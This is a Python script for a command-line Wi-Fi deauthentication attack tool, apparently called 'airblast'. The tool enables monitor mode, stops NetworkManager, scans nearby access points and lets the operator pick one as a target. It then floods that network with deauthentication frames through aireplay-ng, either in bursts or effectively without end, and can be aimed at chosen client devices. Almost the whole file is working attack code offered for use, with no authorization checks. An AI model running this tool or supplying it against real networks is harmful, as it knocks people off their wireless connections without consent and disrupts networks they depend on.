#!/usr/bin/env python3

import os
import sys
import signal
import logging
import argparse
import threading
import subprocess
import traceback
import copy
from typing import Dict, Generator, List, Union
import inspect
import time
import glob

from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
    Dot11QoS, Dot11Deauth, Dot11

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from time import sleep
from collections import defaultdict

# Import utils from the same directory
import os.path
import sys
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from utils import *

conf.verb = 0



def clear_line(n=1):
    """Clear n lines from the terminal"""
    for _ in range(n):
        sys.stdout.write("\033[F")  # Move cursor up one line
        sys.stdout.write("\033[K")  # Clear the line
    sys.stdout.flush()

class Interceptor:
    _ABORT = False
    _PRINT_STATS_INTV = 1
    _DEAUTH_INTV = 0.100  # 100[ms]
    _CH_SNIFF_TO = 2
    _SSID_STR_PAD = 42  # total len 80

    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
                 ssid_name, bssid_addr, custom_client_macs, custom_channels, deauth_all_channels, autostart, debug_mode):
        self.interface = net_iface
        self.original_interface = net_iface  # Store the original interface name
        # Save the interface name to a temp file for restore_network.sh
        with open('/tmp/airblast_interface.tmp', 'w') as f:
            f.write(net_iface)
        self._waiting_for_input = False  # Add flag for input state
        self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV  # fails to send for 5 consecutive seconds
        self._current_channel_num = None
        self._current_channel_aps = set()
        self.attack_loop_count = 0
        self.target_ssid: Union[SSID, None] = None
        self._debug_mode = debug_mode
        self._networkmanager_was_stopped = False

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Stopping NetworkManager...")
            if self._kill_networkmanager():
                self._networkmanager_was_stopped = True
                print_info(f"NetworkManager stopped successfully")
            else:
                print_error(f"Failed to stop NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self.log_debug(f"Supported channels: {[c for c in self._channel_range.keys()]}")
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
        self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
        self.log_debug(f"Selected custom ssid name: {self._custom_ssid_name}")
        self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
        self.log_debug(f"Selected custom bssid addr: {self._custom_bssid_addr}")
        self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
        self.log_debug(f"Selected target client mac addrs: {self._custom_target_client_mac}")
        self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
        self.log_debug(f"Selected target client channels: {self._custom_target_ap_channels}")

        self._custom_target_ap_last_ch = 0
        self._midrun_output_buffer: List[str] = list()
        self._midrun_output_lck = threading.RLock()
        self._deauth_all_channels = deauth_all_channels
        self._ch_iterator: Union[Generator[int, None, int], None] = None
        if self._deauth_all_channels:
            self._ch_iterator = self._init_channels_generator()
        print_info(f"De-auth all channels enabled -> {BOLD}{self._deauth_all_channels}{RESET}")
        self._autostart = autostart

    @staticmethod
    def parse_custom_ssid_name(ssid_name: Union[None, str]) -> Union[None, str]:
        if ssid_name is not None:
            ssid_name = str(ssid_name)
            if len(ssid_name) == 0:
                print_error(f"Custom SSID name cannot be an empty string")
                raise Exception("Invalid SSID name")
        return ssid_name

    @staticmethod
    def parse_custom_bssid_addr(bssid_addr: Union[None, str]) -> Union[None, str]:
        if bssid_addr is not None:
            try:
                bssid_addr = Interceptor.verify_mac_addr(bssid_addr)
            except Exception as exc:
                print_error(f"Invalid bssid address -> {bssid_addr}")
                raise Exception("Bad custom BSSID mac address")
        return bssid_addr

    @staticmethod
    def verify_mac_addr(mac_addr: str) -> str:
        RandMAC(mac_addr)
        return mac_addr

    @staticmethod
    def parse_custom_client_mac(client_mac_addrs: Union[None, str]) -> List[str]:
        custom_client_mac_list = list()
        if client_mac_addrs is not None:
            for mac in client_mac_addrs.split(','):
                try:
                    custom_client_mac_list.append(Interceptor.verify_mac_addr(mac))
                except Exception as exc:
                    print_error(f"Invalid custom client mac address -> {mac}")
                    raise Exception("Bad custom client mac address")

        if custom_client_mac_list:
            print_info(f"Disabling broadcast deauth, attacking custom clients instead: {custom_client_mac_list}")
        else:
            print_info(f"No custom clients selected, enabling broadcast deauth and attacking all connected clients")

        return custom_client_mac_list

    def parse_custom_channels(self, channel_list: Union[None, str]):
        ch_list = list()
        if channel_list is not None:
            try:
                ch_list = [int(ch) for ch in channel_list.split(',')]
            except Exception as exc:
                print_error(f"Invalid custom channel input -> {channel_list}")
                raise Exception("Bad custom channel input")

            if len(ch_list):
                supported_channels = self._channel_range.keys()
                for ch in ch_list:
                    if ch not in supported_channels:
                        print_error(f"Custom channel {ch} is not supported by the network interface"
                                  f" {list(supported_channels)}")
                        raise Exception("Unsupported channel")
        return ch_list

    def _enable_monitor_mode(self):
        """Enable monitor mode using airmon-ng"""
        # Kill interfering processes
        cmd = f"sudo airmon-ng check kill"
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        if os.system(cmd):
            print_error(f"Failed to kill interfering processes")
            return False

        # Set monitor mode using airmon-ng
        cmd = f"sudo airmon-ng start {self.interface}"
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        if os.system(cmd):
            print_error(f"Failed to set monitor mode on {self.interface}")
            return False

        # Update interface name to include 'mon' suffix
        self.interface = f"{self.interface}mon"
        print_info(f"Interface name updated to {self.interface}")

        # Give the interface time to initialize
        sleep(2)

        # Verify interface state
        max_retries = 3
        for i in range(max_retries):
            # Check if monitor mode is enabled
            mm_enabled = os.system(f"sudo iw {self.interface} info | grep 'type monitor' > /dev/null 2>&1")

            if mm_enabled == 0:
                self.log_debug(f"Monitor mode is enabled -> {mm_enabled == 0}")
                return True
            
            if i < max_retries - 1:
                print_info(f"Waiting for monitor mode... (attempt {i+1}/{max_retries})")
                sleep(2)
            else:
                print_error(f"Interface {self.interface} failed to enter monitor mode")
                return False

        return False

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    @staticmethod
    def _start_networkmanager():
        cmd = 'systemctl start NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        return [int(channel.split('Channel')[1].split(':')[0].strip())
                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                if 'Channel' in channel and 'Current' not in channel]

    def _get_channel_range(self) -> List[int]:
        return self._custom_target_ap_channels or list(self._channel_range.keys())

    def _ap_sniff_cb(self, pkt):
        """Callback for processing beacon frames"""
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                
                # Skip if no SSID or if it doesn't match custom filters
                if ap_mac == BD_MACADDR or not ssid or \
                   (self._custom_ssid_name_is_set() and self._custom_ssid_name.lower() not in ssid.lower()):
                    return
                elif self._custom_bssid_addr_is_set() and ap_mac.lower() != self._custom_bssid_addr.lower():
                    return
                
                # Get channel from packet
                pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                
                # Add to discovered networks
                if ssid not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
                
                # Update channel information
                self._all_ssids[band_type][ssid].add_channel(
                    pkt_ch if pkt_ch in self._channel_range else self._current_channel_num
                )
                
                if self._custom_ssid_name_is_set():
                    self._custom_target_ap_last_ch = self._all_ssids[band_type][ssid].channel
                
        except Exception as exc:
            self.log_debug(f"Error processing packet: {str(exc)}")

    def _scan_channels_for_aps(self):
        """Scan for available networks using Scapy"""
        channels_to_scan = self._get_channel_range()
        print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
        if self._custom_ssid_name_is_set():
            print_info(f"Scanning for target SSID -> {BOLD}{self._custom_ssid_name}{RESET}")
        
        try:
            for idx, ch_num in enumerate(channels_to_scan):
                if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() \
                        and self._current_channel_num - self._custom_target_ap_last_ch > 2:
                    # make sure sniffing doesn't stop on an overlapped channel for custom SSIDs
                    return
                    
                self._set_channel(ch_num)
                print_info(f"Scanning channel {BOLD}{self._current_channel_num}{RESET}, remaining -> "
                           f"{len(channels_to_scan) - (idx + 1)} ", end="\r")
                
                # Sniff for beacon frames with reduced timeout
                sniff(prn=self._ap_sniff_cb, 
                      iface=self.interface, 
                      timeout=0.5,  # Reduced from 2 seconds to 0.5 seconds per channel
                      stop_filter=lambda p: Interceptor._ABORT is True)
        finally:
            printf("")

    def _found_custom_ssid_name(self):
        for all_channel_aps in self._all_ssids.values():
            for ssid_name in all_channel_aps.keys():
                if ssid_name == self._custom_ssid_name:
                    return True
        return False

    def _custom_ssid_name_is_set(self):
        return self._custom_ssid_name is not None

    def _custom_bssid_addr_is_set(self):
        return self._custom_bssid_addr is not None

    def _find_ap_channel(self, target_bssid: str) -> int:
        """Find the correct channel for an AP using airodump-ng"""
        try:
            print_info(f"\nLocating correct channel for {BOLD}{target_bssid}{RESET}...")
            
            # Create temporary directory for airodump output
            if not os.path.exists('temp'):
                os.makedirs('temp')
            
            # Clean up any old files
            os.system("rm -f temp/channel_scan-*")
            
            # Run airodump-ng for a short time to get accurate channel info
            cmd = f"timeout 3 airodump-ng --bssid {target_bssid} -w temp/channel_scan {self.interface}"
            os.system(cmd)
            
            # Read the CSV file
            csv_files = glob.glob('temp/channel_scan-*.csv')
            if not csv_files:
                return None
            
            csv_file = csv_files[0]
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Parse the first section for AP info
            for line in lines:
                if target_bssid.lower() in line.lower():
                    parts = line.strip().split(',')
                    if len(parts) >= 4:
                        channel = int(parts[3].strip())
                        print_info(f"Found AP on channel: {BOLD}{channel}{RESET}")
                        return channel
            
            return None
        except Exception as e:
            print_error(f"Error finding channel: {str(e)}")
            return None
        finally:
            # Cleanup
            os.system("rm -f temp/channel_scan-*")

    def _scan_for_networks(self):
        """Scan for available networks using airodump-ng"""
        try:
            print_info(f"\nScanning for networks (15 seconds)...")
            
            # Create temporary directory for airodump output
            if not os.path.exists('temp'):
                os.makedirs('temp')
            
            # Clean up any old files
            os.system("rm -f temp/scan-*")
            
            # Run airodump-ng for 15 seconds
            cmd = f"timeout 15 airodump-ng -w temp/scan {self.interface}"
            os.system(cmd)
            
            # Read the CSV file
            csv_files = glob.glob('temp/scan-*.csv')
            if not csv_files:
                return []
            
            networks = []
            csv_file = csv_files[0]
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Parse the first section for AP info
            reading_aps = True
            for line in lines:
                if line.strip() == '':
                    continue
                if 'BSSID' in line:
                    continue
                if 'Station MAC' in line:
                    reading_aps = False
                    continue
                if not reading_aps:
                    break
                
                parts = line.strip().split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    power = parts[8].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    
                    if bssid and channel and essid:
                        try:
                            channel = int(channel)
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid,
                                'power': power
                            })
                        except ValueError:
                            continue
            
            return networks
        except Exception as e:
            print_error(f"Error scanning networks: {str(e)}")
            return []
        finally:
            # Cleanup
            os.system("rm -f temp/scan-*")

    def _start_initial_ap_scan(self) -> SSID:
        """Start initial AP scan and let user select target"""
        self._scan_channels_for_aps()
        
        # Organize discovered networks by channel
        for band_ssids in self._all_ssids.values():
            for ssid_name, ssid_obj in band_ssids.items():
                self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)

        # Display networks
        pref = '[   ] '
        preflen = len(pref)
        printf(f"{DELIM}\n"
               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', preflen)}")

        ctr = 0
        target_map: Dict[int, SSID] = dict()
        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for ssid_name, ssid_obj in all_channel_aps.items():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
                
        if not target_map:
            Interceptor.abort_run("No APs were found, quitting...")

        printf(DELIM)

        # Get user selection
        chosen = -1
        if self._autostart:
            if len(target_map) > 1:
                print_error(f"Cannot autostart!")
                print_error(f"Found more than 1 access points, try better filters")
            else:
                print_info("One target was found, autostart was set to True")
                chosen = 1

        while chosen not in target_map.keys():
            try:
                user_input = print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}: ")
                chosen = int(user_input)
            except ValueError:
                print_error("Please enter a valid number")

        return target_map[chosen]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid.mac_addr:
                    c_mac = pkt.addr1
                    if c_mac not in [BD_MACADDR, self.target_ssid.mac_addr] and c_mac not in self.target_ssid.clients:
                        self.target_ssid.clients.append(c_mac)
                        add_to_target_list = len(self._custom_target_client_mac) == 0 or c_mac in self._custom_target_client_mac
                        with self._midrun_output_lck:
                            self._midrun_output_buffer.append(f"Found new client {BOLD}{c_mac}{RESET},"
                                                              f" adding to target list -> "
                                                              f"{GREEN if add_to_target_list else RED}{add_to_target_list}{RESET}")
        except:
            pass

    def _print_midrun_output(self):
        bf_sz = len(self._midrun_output_buffer)
        with self._midrun_output_lck:
            for output in self._midrun_output_buffer:
                print_cmd(output)
            if bf_sz > 0:
                printf(DELIM, end="\n")
                bf_sz += 1
        return bf_sz

    @staticmethod
    def _packet_confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        print_info(f"Setting up a listener for new clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT is True)

    def _get_target_clients(self) -> List[str]:
        return self._custom_target_client_mac or self.target_ssid.clients

    def _send_deauth_broadcast(self, ap_mac: str, num_packets: int):
        """Send broadcast deauthentication packets using aireplay-ng"""
        try:
            print_info(f"\nStarting aireplay-ng deauth attack...")
            print_info(f"Target BSSID: {BOLD}{ap_mac}{RESET}")
            print_info(f"Interface: {BOLD}{self.interface}{RESET}")
            print_info(f"Channel: {BOLD}{self.target_ssid.channel}{RESET}")
            print_info(f"Number of deauth packets: {BOLD}{num_packets}{RESET}")
            
            # Set initial channel
            os.system(f"iwconfig {self.interface} channel {self.target_ssid.channel}")
            
            # Start aireplay-ng in a subprocess so we can monitor its output
            cmd = f"aireplay-ng --deauth {num_packets} -a {ap_mac} {self.interface}"
            process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # Loading animation characters
            loading_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
            loading_idx = 0
            
            # Monitor output for channel mismatch
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                
                # Check for channel mismatch message
                if "but the AP uses channel" in line:
                    # Extract the correct channel number
                    correct_channel = int(line.split("channel")[-1].strip())
                    print_info(f"Detected AP on channel {correct_channel}, switching...")
                    
                    # Update target channel and set it
                    self.target_ssid.channel = correct_channel
                    os.system(f"iwconfig {self.interface} channel {correct_channel}")
                    
                    # Restart the attack with the correct channel
                    process.terminate()
                    cmd = f"aireplay-ng --deauth {num_packets} -a {ap_mac} {self.interface}"
                    process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                elif "Waiting for beacon frame" in line:
                    # Show loading animation
                    print(f"\r{loading_chars[loading_idx]} {line.strip()}", end="")
                    loading_idx = (loading_idx + 1) % len(loading_chars)
                else:
                    print(line.strip())
            
            return True
        except Exception as e:
            print_error(f"Failed to send broadcast deauth: {str(e)}")
            return False

    def _run_deauther(self):
        """Main deauthentication attack loop"""
        try:
            # Stop status updates while getting input
            self._waiting_for_input = True
            
            # Clear any previous output
            print("\n")
            
            # Ask for number of deauth packets
            while True:
                try:
                    print_info(f"Target: {BOLD}{self.target_ssid.name}{RESET}")
                    print_info(f"BSSID: {BOLD}{self.target_ssid.mac_addr}{RESET}")
                    print_info(f"Channel: {BOLD}{self.target_ssid.channel}{RESET}")
                    
                    user_input = input("\n[?] Enter number of deauth packets to send (0 for continuous attack): ").strip()
                    
                    if not user_input:
                        print_error("Please enter a number")
                        continue
                        
                    num_packets = int(user_input)
                    if num_packets >= 0:
                        break
                    print_error("Please enter a non-negative number")
                    
                except ValueError:
                    print_error("Please enter a valid number")
                except KeyboardInterrupt:
                    print("\nAttack cancelled by user")
                    Interceptor._ABORT = True
                    return
            
            # Convert 0 (continuous) to 1000000 packets
            if num_packets == 0:
                num_packets = 1000000
                print_info("\nStarting continuous deauth attack (press Ctrl+C to stop)")
            else:
                print_info(f"\nSending {num_packets} deauth packets")
                
            # Start the deauth attack using aireplay-ng
            self._send_deauth_broadcast(self.target_ssid.mac_addr, num_packets)
                
        except Exception as exc:
            Interceptor.abort_run(f"Exception in deauth-loop: {str(exc)}")

    def _verify_ap_channel(self, bssid: str, initial_channel: int) -> int:
        """Verify the correct channel for an AP by checking beacon frames"""
        print_info(f"Verifying correct channel for {BOLD}{bssid}{RESET}...")
        
        for channel in range(1, 14):  # Check common 2.4GHz channels
            self._set_channel(channel)
            try:
                # Try to capture a beacon frame from this AP
                packets = sniff(iface=self.interface, 
                              timeout=1,
                              lfilter=lambda pkt: (
                                  Dot11Beacon in pkt and
                                  pkt[Dot11].addr3.lower() == bssid.lower()
                              ))
                
                if packets:
                    if channel != initial_channel:
                        print_info(f"Corrected channel: {BOLD}{channel}{RESET} (was {initial_channel})")
                    return channel
                    
            except Exception as e:
                self.log_debug(f"Error during channel verification: {str(e)}")
                continue
            
        print_info(f"Could not verify channel, using detected channel: {BOLD}{initial_channel}{RESET}")
        return initial_channel

    def run(self):
        """Main run method"""
        self.target_ssid = self._start_initial_ap_scan()
        
        # Verify correct channel
        verified_channel = self._verify_ap_channel(self.target_ssid.mac_addr, self.target_ssid.channel)
        self.target_ssid.channel = verified_channel
        
        print_info(f"Selected target {self.target_ssid.name}")
        print_info(f"Setting channel -> {verified_channel}")
        self._set_channel(verified_channel)

        # Start the deauth attack
        self._run_deauther()

    def report_status(self):
        """Report attack status without interfering with user input"""
        start = time.time()
        self._waiting_for_input = True  # Add flag to prevent status updates during input
        
        while not Interceptor._ABORT:
            if not self._waiting_for_input:  # Only show status when not waiting for input
                buffer_sz = self._print_midrun_output()
                print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
                print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
                print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
                print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
                print_info(f"Target clients{BOLD}{str(len(self._get_target_clients())).rjust(80 - 18, ' ')}{RESET}")
                print_info(f"Elapsed sec {BOLD}{str(time.time() - start).rjust(80 - 16, ' ')}{RESET}")
                sleep(Interceptor._PRINT_STATS_INTV)
                if Interceptor._ABORT:
                    break
                clear_line(7 + buffer_sz)
            else:
                sleep(0.1)  # Short sleep when waiting for input

    def log_debug(self, msg: str):
        if self._debug_mode:
            print_debug(msg)

    @staticmethod
    def user_abort(*_):
        """Handle Ctrl+C by running restore_network.sh and then quitting"""
        print_info("\nRestoring network configuration...")
        script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restore_network.sh")
        os.system(f"sudo {script_path}")
        Interceptor.abort_run(f"User asked to stop, quitting...")

    @staticmethod
    def abort_run(msg: str):
        if not Interceptor._ABORT:
            Interceptor._ABORT = True
            sleep(Interceptor._PRINT_STATS_INTV * 1.1)
            printf(f"{DELIM}")
            print_error(msg)
            # Get the current instance to call cleanup
            for frame in inspect.stack():
                if 'self' in frame[0].f_locals:
                    instance = frame[0].f_locals['self']
                    if isinstance(instance, Interceptor):
                        instance.cleanup()
                        break
            exit(0)

    def _iter_next_channel(self):
        self._set_channel(next(self._ch_iterator))

    def _init_channels_generator(self) -> Generator[int, None, int]:
        ch_range = self._get_channel_range()
        ctr = 0
        while not Interceptor._ABORT:
            yield ch_range[ctr]
            ctr = (ctr + 1) % len(ch_range)
        return ctr

    def cleanup(self):
        """Cleanup function to restore system state"""
        # Try both methods to disable monitor mode
        if not self._disable_monitor_mode():
            print_error("Failed to disable monitor mode")

        # Restart NetworkManager if it was stopped
        if self._networkmanager_was_stopped:
            print_info(f"Restarting NetworkManager...")
            if self._start_networkmanager():
                print_info(f"NetworkManager restarted successfully")
            else:
                print_error(f"Failed to restart NetworkManager")

    def _disable_monitor_mode(self):
        """Disable monitor mode using both methods"""
        # Try airmon-ng first
        if os.system("which airmon-ng > /dev/null 2>&1") == 0:
            # If interface name has 'mon' suffix, remove it for airmon-ng stop
            iface = self.interface.replace('mon', '')
            cmd = f"sudo airmon-ng stop {iface}"
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if not os.system(cmd):
                # Update interface name back to original
                self.interface = iface
                return True

        # If airmon-ng fails, try manual method
        cmd = f"sudo iw {self.interface} set type managed"
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        if os.system(cmd):
            return False

        cmd = f"sudo ip link set {self.interface} down"
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        if os.system(cmd):
            return False

        cmd = f"sudo ip link set {self.interface} up"
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

def get_wireless_interfaces():
    """Automatically detect wireless interfaces"""
    try:
        # Check if iwconfig is installed
        try:
            subprocess.check_output(['which', 'iwconfig'], stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError:
            print_error("❌ 'iwconfig' command not found. Please install wireless-tools package.")
            print_info("✨ Try running: sudo apt install wireless-tools")
            sys.exit(1)

        output = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT).decode()
        interfaces = []
        for line in output.split('\n'):
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        return interfaces
    except Exception as e:
        print_error(f"❌ Error detecting wireless interfaces: {str(e)}")
        return []

def get_time():
    return time.time()

def main():
    signal.signal(signal.SIGINT, Interceptor.user_abort)

    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}root{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}AssyrianCipher{RESET}")
    printf(DELIM)
    restore_print()

    if "linux" not in sys.platform:
        raise OSError(f"Unsupported operating system {sys.platform}, only linux is supported...")
    elif os.geteuid() != 0:
        raise PermissionError(f"Must be run as root")

    # Get available wireless interfaces
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print_error("No wireless interfaces found!")
        sys.exit(1)

    # Display available interfaces
    printf(f"\nAvailable wireless interfaces:")
    for i, iface in enumerate(interfaces, 1):
        printf(f"[{BOLD}{YELLOW}{i}{RESET}] {iface}")

    # Get user selection
    while True:
        try:
            choice = int(print_input(f"\nSelect interface (1-{len(interfaces)}): "))
            if 1 <= choice <= len(interfaces):
                selected_interface = interfaces[choice - 1]
                break
            print_error(f"Please enter a number between 1 and {len(interfaces)}")
        except ValueError:
            print_error("Please enter a valid number")

    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-s', '--ssid', help='custom SSID name (case-insensitive)', metavar="ssid_name",
                        action='store', default=None, dest="custom_ssid", required=False)
    parser.add_argument('-b', '--bssid', help='custom BSSID address (case-insensitive)', metavar="bssid_addr",
                        action='store', default=None, dest="custom_bssid", required=False)
    parser.add_argument('--clients', help='MAC addresses of target clients to disconnect,'
                                          ' separated by a comma (i.e -> 00:1A:2B:3C:4D:5G,00:1a:2b:3c:4d:5e)', metavar="client_mac_addrs",
                        action='store', default=None, dest="custom_client_macs", required=False)
    parser.add_argument('-c', '--channels',
                        help='custom channels to scan / de-auth, separated by a comma (i.e -> 1,3,4)',
                        metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
    parser.add_argument('-a', '--autostart',
                        help='autostart the de-auth loop (if the scan result contains a single access point)',
                        action='store_true', default=False, dest="autostart", required=False)
    parser.add_argument('-d', '--debug', help='enable debug prints',
                        action='store_true', default=False, dest="debug_mode", required=False)
    parser.add_argument('--deauth-all-channels', help='enable de-auther on all channels',
                        action='store_true', default=False, dest="deauth_all_channels", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=selected_interface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager,
                           ssid_name=pargs.custom_ssid,
                           bssid_addr=pargs.custom_bssid,
                           custom_client_macs=pargs.custom_client_macs,
                           custom_channels=pargs.custom_channels,
                           deauth_all_channels=pargs.deauth_all_channels,
                           autostart=pargs.autostart,
                           debug_mode=pargs.debug_mode)
    attacker.run()


if __name__ == "__main__":
    main()
